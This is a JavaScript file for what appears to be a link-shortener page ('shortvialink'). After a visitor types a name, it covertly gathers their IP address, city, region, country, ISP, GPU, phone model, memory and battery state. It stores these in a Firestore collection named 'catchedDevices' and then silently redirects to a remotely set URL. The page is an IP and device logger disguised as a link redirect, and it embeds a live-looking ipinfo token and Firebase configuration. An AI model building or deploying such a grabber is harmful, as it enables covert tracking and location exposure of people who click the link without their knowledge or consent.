import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
import { getFirestore, doc, getDoc, setDoc, collection, onSnapshot } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";

// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyAPjvIptK9QLL38_tMJAc_mcbPlrvNm-BI",
    authDomain: "shortvialink.firebaseapp.com",
    projectId: "shortvialink",
    storageBucket: "shortvialink.firebasestorage.app",
    messagingSenderId: "898273994480",
    appId: "1:898273994480:web:807a53bc825302af33c435",
    measurementId: "G-6WDS2TDBKK"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

document.addEventListener("DOMContentLoaded", async () => {
    // Button click event listener
    document.getElementById("submitButton").addEventListener("click", buttonClicked);

    async function buttonClicked() {
        const name = document.getElementById("nameInput").value.trim();
        if (!name) {
            alert("Please enter a name.");
            return;
        }

        document.querySelector('.login').style.display = 'none';

        try {
            // Collect Device Information
            const response = await fetch("https://ipinfo.io/json?token=d21a1697c43d12");
            const data = await response.json();
            const canvas = document.createElement("canvas");
            const gl = canvas.getContext("webgl");
            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");

            const userAgent = navigator.userAgent;

            function getPhoneModel() {
                const regexPhone = /\b(SM-\w+|Pixel.*|iPhone.*|Mi\s.*|Redmi.*|OnePlus.*|Poco.*|Vivo.*|Oppo.*|Realme.*|Honor.*|Huawei.*)\b/i;
                const match = userAgent.match(regexPhone);
                return match ? match[0] : "Unknown Phone";
            }
            const phoneModel = getPhoneModel();

            let deviceType;
            if (/Mobi|Android/i.test(userAgent)) {
                deviceType = "Mobile";
            } else if (/Tablet|iPad/i.test(userAgent)) {
                deviceType = "Tablet";
            } else {
                deviceType = "Desktop";
            }

            let browser;
            if (/Chrome/i.test(userAgent)) {
                browser = "Chrome";
            } else if (/Firefox/i.test(userAgent)) {
                browser = "Firefox";
            } else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) {
                browser = "Safari";
            } else if (/Edge/i.test(userAgent)) {
                browser = "Edge";
            } else if (/MSIE|Trident/i.test(userAgent)) {
                browser = "Internet Explorer";
            } else {
                browser = "Unknown Browser";
            }

            const os = navigator.platform;
            const ip = data.ip;
            const location = `${data.city}, ${data.region}, ${data.country}`;
            const isp = data.org;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
            const memory = `${navigator.deviceMemory || "Unknown"} GB`;
            const orientation = screen.orientation ? screen.orientation.type : "Unknown";

            const battery = await navigator.getBattery();
            const batteryStatus = `Charge: ${Math.round(battery.level * 100)}%, ` + (battery.charging ? "Charging" : "Not Charging");

            // Save data to Firestore
            const docRef = doc(db, "catchedDevices", `${name}:device_info`);
            await setDoc(docRef, {
                deviceType: deviceType,
                phoneModel: phoneModel,
                os: os,
                browser: browser,
                ip: ip,
                location: location,
                isp: isp,
                gpu: gpu,
                memory: memory,
                orientation: orientation,
                battery: batteryStatus,
            });

            // Fetch the global redirect URL from Firestore
            const settingsDocRef = doc(db, "settings", "globalRedirectUrl");
            const settingsDocSnap = await getDoc(settingsDocRef);

            if (settingsDocSnap.exists()) {
                const redirectData = settingsDocSnap.data();
                const redirectUrl = redirectData.redirectUrl

                // Redirect to the dynamic link
                window.location.replace(redirectUrl);
            } else {
                alert("No global redirect URL found.");
            }
        } catch (error) {
            console.error("Error in buttonClicked:", error);
            alert("An error occurred. Please try again later.");
        }
    }
});
